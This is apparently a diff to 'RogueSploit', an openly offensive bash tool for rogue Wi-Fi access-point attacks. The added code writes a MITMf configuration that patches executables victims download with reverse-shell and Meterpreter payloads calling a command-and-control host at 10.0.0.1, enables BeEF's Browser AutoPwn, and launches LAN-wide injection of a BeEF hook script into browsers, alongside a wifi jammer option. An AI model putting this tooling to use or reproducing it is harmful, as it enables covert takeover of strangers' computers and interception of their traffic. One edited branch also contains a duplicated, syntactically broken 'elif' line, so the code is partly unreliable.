+		WindowsType = ALL 	# choices: x86/x64/ALL/None
+		FatPriority = x86   # choices: x86 or x64
+		
+		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
+
+		CompressedFiles = True #True/False
+			[[[[LinuxIntelx86]]]]
+			SHELL = reverse_shell_tcp   # This is the BDF syntax
+			HOST = 10.0.0.1			# The C2
+			PORT = 8888
+			SUPPLIED_SHELLCODE = None
+			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
+			
+			[[[[LinuxIntelx64]]]]
+			SHELL = reverse_shell_tcp
+			HOST = 10.0.0.1
+			PORT = 9999
+			SUPPLIED_SHELLCODE = None
+			MSFPAYLOAD = linux/x64/shell_reverse_tcp
+
+			[[[[WindowsIntelx86]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+			PATCH_METHOD = automatic
+			HOST = 10.0.0.1
+			PORT = 8090
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_inline_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			# PATCH_DLLs as they come across
+			PATCH_DLL = False
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = False
+			# XP_MODE  - to support XP targets
+			XP_MODE = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = veil_go_payload.exe
+			MSFPAYLOAD = windows/meterpreter/reverse_tcp
+
+			[[[[WindowsIntelx64]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic or onionduke
+			PATCH_METHOD = automatic
+			HOST = 10.0.0.1
+			PORT = 8088
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_stager_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			PATCH_DLL = True
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD onionduke DLL/EXE can x86 32bit and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = pentest_x64_payload.exe
+			MSFPAYLOAD = windows/x64/shell/reverse_tcp
+
+			[[[[MachoIntelx86]]]]
+			SHELL = reverse_shell_tcp
+			HOST = 10.0.0.1
+			PORT = 4444
+			SUPPLIED_SHELLCODE = None
+			MSFPAYLOAD = linux/x64/shell_reverse_tcp
+
+			[[[[MachoIntelx64]]]]
+			SHELL = reverse_shell_tcp
+			HOST = 10.0.0.1
+			PORT = 5555
+			SUPPLIED_SHELLCODE = None
+			MSFPAYLOAD = linux/x64/shell_reverse_tcp
+
+		# Call out the difference for targets here as they differ from ALL
+		# These settings override the ALL settings
+		
+		[[[sysinternals.com]]]
+		LinuxType = None
+		WindowsType = ALL
+		CompressedFiles = False
+		#inherits WindowsIntelx32 from ALL
+			[[[[WindowsIntelx86]]]]
+			PATCH_DLL = False
+			ZERO_CERT = True
+
+		[[[sourceforge.org]]]
+		WindowsType = x64
+		CompressedFiles = False
+
+			[[[[WindowsIntelx64]]]]
+			PATCH_DLL = False
+
+			[[[[WindowsIntelx86]]]]
+			PATCH_DLL = False
+" > /etc/mitmf/mitmf.conf
+	sleep 0.6
+	echo -e $blue"["$yellow"*"$blue"]"$white" Enabling Autopwn module for BeEF! "$blue"["$yellow"*"$blue"]"
+	cp /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml.reset
+	echo "# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+beef:
+    module:
+        browser_autopwn:
+            enable: true
+            category: "Metasploit"
+            name: "Browser AutoPwn"
+            description: "This module will redirect a user to the autopwn port on a Metasploit listener and then rely on Metasploit to handle the resulting shells.  If the Metasploit extension is loaded, this module will pre-populate the URL to the pre-launched listener.  Otherwise, enter the URL you would like the user to be redirected to."
+            authors: ["sussurro"]
+            target:
+                working: ["ALL"]
+" > /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
+	sleep 0.6
+	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
+	rogueon & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
+	menu
+}
 #Welcome Screen
 welcome () {
 myname=$(zenity --entry --title="[*] ROGUESPLOIT [*]" --text=" Input your name or nick :D ");
@@ -136,19 +939,28 @@ if test $answer1 == '1'
 elif test $answer1 == '2'
 	then
 	clear
-	echo -e $green"Which AutoPwn do you want to start $myname? "
+	echo -e $green"Which services do you want to start $myname? "
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -e $white"3. BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
-	read autopwnans
-	if test $autopwnans == '1'
+	read choice
+	if test $choice == '1'
 		then
+		clear
 		autopwning1
 		clear
 		menu
-	elif test $autopwnans == '2'
+	elif test $choice == '2'
 		then
+		clear
 		autopwning2
+		clear
+		menu
+	elif test $choice == '3'
+		then
+		clear
+		beefinject
 		clear
 		menu
 	else 
@@ -175,12 +987,14 @@ elif test $answer1 == '2'
 	fi
 elif test $answer1 == '3'
 	then
+	clear
 	echo -e $cyan"Starting massive jamming as you ordered!"
 	python wifijammer.py
 	menu	
 elif test $answer1 == '4'
 	then
-	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
+	clear
+	echo -e "Made by B4ckP0r7 with love, Italian Engeering" | lolcat
 	echo -e $blue"   Big thanks to:"
 	echo -e $lightgreen"--<[ $myname, a fantastic user! ]>--"
 	echo -e $red"--<[ My friends ]>--"
@@ -204,6 +1018,7 @@ elif test $answer1 == '5'
 	exit
 elif test $answer1 == '6'
 	then
+	clear
 	echo -e $white" TUTORIAL FOR ROGUESPLOIT"
 	echo -e $yellow" 1) OPEN 2 DIFFERENT TERMINALS;"
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
@@ -215,20 +1030,34 @@ elif test $answer1 == '6'
 	menu
 elif test $answer1 == '7'
 	then
-	echo -ne $red"This update will delete everything in this directory, continue anyway? [y/N] "; tput sgr0
+	echo -ne $red"[!!] This update will delete everything in this directory, continue anyway? [y/N] "; tput sgr0
 	read cancel
 	if [ $cancel != 'n' ] && [ $cancel != 'N' ]
 		then
-		echo -e $yellow"Updating RogueSploit, just wait...."
-		cd ../ && sudo rm -rf RogueSploit/
-		git clone http://github.com/b4ckp0r7/RogueSploit.git
-		sudo chmod 777 RogueSploit/* -R
-		echo -e $yellow"Update.."; sleep 2; echo -e $lightgreen"* DONE *"
-		echo -e $okegreen"Now $myname just exit RogueSploit directory and comeback and run again RogueSploit!!"
+		sleep 0.7 & echo -e $yellow"[!] Making backup of old version (you can found it  $HOME/RogeBackup/)[!]"
+		rm -rf $HOME/RogueBackup
+		mkdir $HOME/RogueBackup
+		cp $0 $HOME/RogueBackup/RogueSploitOld.backup
+		echo -e $blue"[*]"$yellow"Updating RogueSploit script"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/RogueSploit" -s -o $0
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating roguepwn1.rc file"$blue"[*]"
+		cp roguepwn1.rc $HOME/RogueBackup/roguepwn1.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn1.rc" -s -o $PWD/roguepwn1.rc
+		sleep 0.4
+		cp roguepwn1.rc $HOME/RogueBackup/roguepwn2.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
+		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
+		chmod +x * -R
+		echo -e ""$green"Updated successfully! Restarting the script to apply the changes ..."
+		sleep 3
+		exec $0
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
-		echo -e $red"Update aborted! Returning main menu in 5 secs!"
+		echo -e $red"[!!] Update aborted! Returning main menu in 5 secs [!!]"
 		sleep 5
 		menu
 	fi
@@ -245,7 +1074,7 @@ else
 		ifconfig at0 down
 		sleep 1
 		echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
-		echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
+		echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 		sleep 2
 		clear
 		exit
@@ -287,22 +1116,31 @@ if test $answer1 == '1'
 elif test $answer1 == '2'
 	then
 	clear
-	echo -e $green"Which AutoPwn do you want to start $myname? "
+	echo -e $green"Which services do you want to start $myname? "
 	echo -e $yellow" 1. Browser Autopwn 1 "
 	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -e $white"3. BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
-	read autopwnans
-	if test $autopwnans == '1'
+	read choice
+	if test $choice == '1'
 		then
+		clear
 		autopwning1
 		clear
 		menu
-	elif test $autopwnans == '2'
+	elif test $choice == '2'
 		then
+		clear
 		autopwning2
 		clear
 		menu
-	else 
+	elif test $choice == '3'
+		then
+		clear
+		beefinject
+		clear
+		menu
+	else
 		echo -e $red"[!]  Incorrect Number  [!]"
 		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
 		read back
@@ -331,7 +1169,7 @@ elif test $answer1 == '3'
 	menu	
 elif test $answer1 == '4'
 	then
-	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
+	echo -e "Made by _B4ckP0r7 with love, Italian Engeering"
 	echo -e $blue"   Big thanks to:"
 	echo -e $lightgreen"--<[ $myname, a fantastic user! ]>--"
 	echo -e $red"--<[ My friends ]>--"
@@ -365,21 +1203,36 @@ elif test $answer1 == '6'
 	read continuos
 	menu
 elif test $answer1 == '7'
+	elif test $answer1 == '7'
 	then
-	echo -ne $red"This update will delete everything in this directory, continue anyway? [y/N] "; tput sgr0
+	echo -ne $red"[!!] This update will delete everything in this directory, continue anyway? [y/N] "; tput sgr0
 	read cancel
 	if [ $cancel != 'n' ] && [ $cancel != 'N' ]
 		then
-		echo -e $yellow"Updating RogueSploit, just wait...."
-		cd ../ && sudo rm -rf RogueSploit/
-		git clone http://github.com/b4ckp0r7/RogueSploit.git
-		sudo chmod 777 RogueSploit/* -R
-		echo -e $yellow"Update.."; sleep 2; echo -e $lightgreen"* DONE *"
-		echo -e $okegreen"Now $myname just exit RogueSploit directory and comeback and run again RogueSploit!!"
+		sleep 0.7 & echo -e $yellow"[!] Making backup of old version (you can found it  $HOME/RogeBackup/)[!]"
+		rm -rf $HOME/RogueBackup
+		mkdir $HOME/RogueBackup
+		cp $0 $HOME/RogueBackup/RogueSploitOld.backup
+		echo -e $blue"[*]"$yellow"Updating RogueSploit script"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/RogueSploit" -s -o $0
+		sleep 0.4
+		echo -e $blue"[*]"$yellow"Updating roguepwn1.rc file"$blue"[*]"
+		cp roguepwn1.rc $HOME/RogueBackup/roguepwn1.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn1.rc" -s -o $PWD/roguepwn1.rc
+		sleep 0.4
+		cp roguepwn1.rc $HOME/RogueBackup/roguepwn2.rc.backup
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/roguepwn2.rc" -s -o $PWD/roguepwn2
+		echo -e $blue"[*]"$yellow"Updating roguepwn2.rc file"$blue"[*]"
+		curl "https://raw.githubusercontent.com/B4ckP0r7/RogueSploit/master/README.md" -s -o $PWD/README.md
+		echo -e $blue"[*]"$yellow"Updating README file"$blue"[*]"
+		chmod +x * -R
+		echo -e ""$green"Updated successfully! Restarting the script to apply the changes ..."
+		sleep 3
+		exec $0
 		exit
 	elif [ $cancel != 'y' ] && [ $cancel != 'Y' ]
 		then
-		echo -e $red"Update aborted! Returning main menu in 5 secs!"
+		echo -e $red"[!!] Update aborted! Returning main menu in 5 secs [!!]"
 		sleep 5
 		menu
 	fi
@@ -405,3 +1258,6 @@ else
 		menu
 	fi
 fi
+
+
+
